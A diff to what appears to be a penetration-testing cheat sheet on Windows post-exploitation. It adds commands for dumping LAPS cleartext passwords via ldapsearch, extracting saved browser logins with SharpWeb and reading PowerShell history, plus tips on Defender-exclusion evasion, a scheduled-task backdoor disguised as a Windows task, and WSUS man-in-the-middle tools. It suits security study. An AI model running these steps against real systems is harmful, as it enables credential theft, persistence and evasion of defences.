@@ -20,6 +20,10 @@ wmic ntdomain get /all /format:List
 wmic netclient get /all /format:List
 nltest /trusted_domains
 wmic pagefile
+# Environment variable
+set # On cmd
+dir env: # On P$
+Get-ChildItem Env: | ft Key,Value # On P$
 ```
 
 You can try to see if [wesng](https://github.com/bitsadmin/wesng) say something interesting.
@@ -76,6 +80,55 @@ HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell 
 
 For more information about that technique refer to [T1087.001 - Account Discovery: Local Account](https://attack.mitre.org/techniques/T1087/001/)
 
+#### Command History
+
+```bash
+%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+cat (Get-PSReadlineOption).HistorySavePath
+```
+
+##### PowerShell Transcription
+
+This setting lets you capture the input and output of Windows PowerShell commands into text-based transcripts
+
+If it is enable, there should be a registry key named "OutputDirectory".
+
+```bash
+reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
+reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
+reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
+reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
+```
+
+##### PowerShell Module Logging
+
+Module logging records pipeline execution details as PowerShell executes, including variable initialization and command invocations. Module logging will record **portions of scripts, some de-obfuscated code**, and some data formatted for output.
+
+Module logging events are written to Event ID (EID) 4103.
+
+```bash
+reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
+reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
+reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
+reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
+```
+
+##### PowerShell  Script Block Logging
+
+Script block logging records blocks of code as they are executed by the PowerShell engine, thereby capturing the full contents of code executed by an attacker, including scripts and commands.
+Due to the nature of script block logging, **it also records de-obfuscated code as it is executed**.
+
+Script block logging events are written to Event ID (EID) 4104.
+
+```bash
+reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
+reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
+reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
+reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
+```
+
+For more information about that technique refer to [T1552 - Unsecured Credentials](https://attack.mitre.org/techniques/T1552/)
+
 #### Network information
 
 ```bash
@@ -100,6 +153,36 @@ For more information about that technique refer to [T1016 - System Network Confi
 ```bash
 Get-MpPreference # Gets preferences for the Windows Defender scans and updates.
 Get-AppLockerPolicyInfo # Gets the local, the effective, or a domain AppLocker policy.
+# Check if there are "JobInactivityTimeout" and "MaxDownloadTime" value set
+reg query "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\BITS"
+# Check if LAPS is deployed
+reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
+# Check if LSA Protection is deployed
+reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA" /v RunAsPPL
+# Check if Credential Guard is enabled
+reg query "HKLM\System\CurrentControlSet\Control\LSA" /v LsaCfgFlags
+```
+
+##### Windows Defender Evasion
+
+If you are Administrator of one system, and it is using Windows Defender, check for the following entries
+
+- **ExclusionExtension**: Specifies an array of file name extensions, such as obj or lib, to exclude from scheduled, custom, and real-time scanning.
+- **ExclusionPath**: File paths to exclude from scheduled and real-time scanning.
+- **ExclusionProcess**: Excludes any files opened by the processes that you specify from scheduled and real-time scanning.
+
+For more information about that technique refer to [T1036 - Masquerading](https://attack.mitre.org/techniques/T1036/)
+
+##### LAPS Evasion
+
+In some organizations, there are *Organization Unit* where administrators or members of the helpdesks have full control access of a computer.
+This means that they we have one of those accounts, we can query the Domain Controller for such passwords as LAPS stores it’s information in Active Directory:
+
+- The expiration time: ms-Mcs-AdmPwdExpirationTime
+- And the actual password in clear text: ms-Mcs-AdmPwd
+
+```bash
+ldapsearch -x -h 192.168.80.10 -D "USERNAME" -w PASSWORD -b "dc=BASELDAP,dc=info" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 ```
 
 #### Remote Desktop Session
@@ -332,7 +415,11 @@ Web browsers commonly save credentials such as website usernames and passwords s
 
 For more information about that technique refer to [T1555.003 - Credentials from Password Stores: Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003/)
 
-https://github.com/djhohnstein/SharpWeb
+[SharpWeb](https://github.com/djhohnstein/SharpWeb) .NET 2.0 CLR compliant project that can retrieve saved logins from Google Chrome, Firefox, Internet Explorer and Microsoft Edge.
+
+```bash
+.\SharpWeb.exe all
+```
 
 ##### Firefox
 
@@ -509,12 +596,21 @@ Here are interesting schedule time for persistence:
 
 [SharPersist](https://github.com/fireeye/SharPersist) can be used to try to perform a Scheduled Task Backdoor
 
+When creating a new scheduled task, try to masquerade it with something like:
+
+- WindowsUpdate
+- WMIPerformanceAdapterExtension
+- ..
+
 ```bash
 # Scheduled Task Backdoor
-SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
+SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "WMIPerformanceAdapterExtension" -m add
 ```
 
-For more information about that technique refer to [T1053.005 - Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)
+For more information about those techniques refer to:
+
+- [T1036.004 - Masquerading: Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004/)
+- [T1053.005 - Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)
 
 ### Service Enumeration
 
@@ -1101,6 +1197,9 @@ The Ntds.dit file is a database that stores Active Directory data, including inf
 
 By default, it is located in "C:\Windows\NTDS\"
 
+Ntds.dit is encrypted with the Password Encryption Key.
+The required Password Encryption Key is stored in the NTDS.dit file, but is encrypted itself with the BOOTKEY. To obtain this BOOTKEY, we need to acquire a copy of the SYSTEM registry hive from the same Domain Controller as we acquired the NTDS.dit file.
+
 ###### *If you don't know, now you know: [LM-hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)*
 
 LM-hashes is the oldest password storage used by Windows, in the 1980’s.
@@ -1281,6 +1380,35 @@ Beginning with Windows 2000, RPC supports a variety of security providers and pa
 - **SCHANNEL SSP**: This SSP implements the Microsoft Unified Protocol Provider security package, which unifies SSL, private communication technology (PCT), and transport level security (TLS) into one security package. It recognizes msstd and fullsic principal names.
 - **NTLM Security Package**: This was the primary security package for NTLM networks prior to Windows 2000.
 
+#### Windows Server Update Services (WSUS)
+
+Why is it interesting ?
+
+- Updates can often be installed by non-privileged users
+- Non-Microsoft code, such as drivers,  available via Windows Update
+
+Windows Server Update Services enables system administrators in organizations to centrally manage the distribution of updates and hotfixes released by Microsoft to a fleet of systems.
+
+From the official documentation of Microsoft, we can read the following
+> WSUS uses SSL for metadata only, not for update files. This is the same way that Microsoft Update distributes updates. Microsoft reduces the risk of sending update files over an unencrypted channel by signing each update. In addition, a hash is computed and sent together with the metadata for each update. When an update is downloaded, WSUS checks the digital signature and hash. If the update has been changed, it is not installed.
+
+All metadata exchanges between the client and the server is done using the Simple Object Access Protocol (SOAP). By exploiting the lack of integrity of the SOAP calls transmitted over an unencrypted HTTP channel, an attacker performing a MITM attack can tamper responses to the SOAP requests "SyncUpdates (software)" and "GetExtendedUpdateInfo".
+
+Luckily, the "CommandLineInstallation" handler specifies additional parameters to pass the binary during the update installation. No integrity checks are made on these parameters, so they can be tampered easily. As a result, Microsoft-signed binaries such as PsExec64 or bginfo can be used in a fake update to achieve command execution on the client side with "NT AUTHORITY\SYSTEM" privileges
+
+We can exploit that by either using:
+
+- [wsuspect-proxy](https://github.com/ctxis/wsuspect-proxy) which can inject 'fake' updates into non-SSL WSUS traffic.
+- [PyWSUS](https://github.com/GoSecure/pywsus) which is standalone implementation of a legitimate WSUS server which sends malicious responses to clients.
+
+For more information refer the this blogpost from [GoSecure](https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/)
+
+##### CVE-2020-1013
+
+This vulnerability allows an attacker to abuse Windows system services to conduct an HTTP to SMB relay and escalate privileges
+
+[WSuspicious](https://github.com/GoSecure/wsuspicious) is a C# program that takes the place of the user local proxy and forces the computer to look for updates while intercepting the WSUS traffic to inject a malicious payload.
+
 #### References
 
 - For the privileges part, thanks to @[decoder-it](https://github.com/decoder-it), his talk "[HIP19: whoami priv - show me your privileges and I will lead you to SYSTEM"](https://www.youtube.com/watch?v=ur2HPyuQlEU)" is a must see
@@ -1291,6 +1419,7 @@ Beginning with Windows 2000, RPC supports a variety of security providers and pa
 - For the "Domain Trusts" part, thank to Girit Haran <https://giritharan.com/active-directory-domains-and-trust/>
 - For the "AppInit DLLs" part, thanks to <https://pentestlab.blog/2020/01/07/persistence-appinit-dlls/>
 - For the "Scheduled Tasks" part, thanks to <https://pentestlab.blog/2019/11/04/persistence-scheduled-tasks/>
+- Fot the "LAPS Evasion" part, thanks to https://malicious.link/post/2017/dump-laps-passwords-with-ldapsearch/
 
 #### Source Todo
 
